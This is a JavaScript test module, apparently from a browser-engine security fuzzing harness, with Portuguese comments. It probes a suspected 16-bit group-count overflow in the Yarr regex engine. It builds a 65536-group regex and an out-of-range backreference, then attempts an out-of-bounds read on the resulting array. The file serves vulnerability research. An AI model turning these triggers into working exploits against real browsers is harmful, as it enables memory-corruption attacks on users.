export default {
    id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
    category: 'Boundary',
    risk:     'HIGH',
    description: 'Foco exclusivo no Integer Overflow do Yarr C++ (Limites de 16-bits).',

    setup: function() {
        this.results = {};
        this.regexps = {};
    },

    trigger: function() {
        // VETOR A: Transbordo do contador de grupos (0x10000 = 65536)
        try {
            const groups = '(a)'.repeat(0x10000); 
            this.regexps.manyGroups = new RegExp(groups);
            // Se o limite estourar, o C++ valida com apenas 1 caractere, 
            // mas retorna um array de 65537 posições (OOB Read candidate)
            this.results.manyGroupsExec = this.regexps.manyGroups.exec('a')?.length;
        } catch(e) { this.results.manyGroupsErr = e.constructor.name; }

        // VETOR B: Backreference além do limite de grupos do Yarr
        try {
            this.regexps.deepBackref = new RegExp('(a)\\65536');
            this.results.deepBackrefExec = this.regexps.deepBackref.exec('a')?.length;
        } catch(e) { this.results.deepBackrefErr = e.constructor.name; }
    },

    probe: [
        s => s.results.manyGroupsExec   ?? s.results.manyGroupsErr, // Deve disparar Type Confusion (null -> 65537)
        s => s.results.deepBackrefExec  ?? s.results.deepBackrefErr, // Deve disparar SyntaxError
        
        // Tentativa de leitura OOB (Out-Of-Bounds) no array corrompido
        s => { try { return s.regexps.manyGroups?.exec('a')?.[50000]; } catch(e) { return e.constructor.name; } },
    ],

    cleanup: function() {
        this.results = {};
        this.regexps = {};
    }
};
